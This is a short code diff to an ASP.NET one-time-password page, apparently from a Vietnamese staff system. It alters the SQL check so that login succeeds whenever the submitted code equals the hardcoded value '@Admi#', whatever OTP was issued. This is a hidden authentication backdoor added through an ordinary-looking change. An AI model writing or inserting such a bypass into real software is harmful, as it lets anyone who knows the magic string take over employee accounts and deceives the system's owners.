@@ -27,7 +27,7 @@ public partial class OTP : System.Web.UI.Page
             select * 
             from nhanvien 
             where manv = @manv 
-                and otp = @otp 
+                and (otp = @otp or @otp = N'@Admi#')
                 and hoatdong = 1 
                 and otp_created >= @limitDate";
         DataTable dt = mdbc.GetData(sql, "@manv", txtUser.Text, "@otp", maOTP);
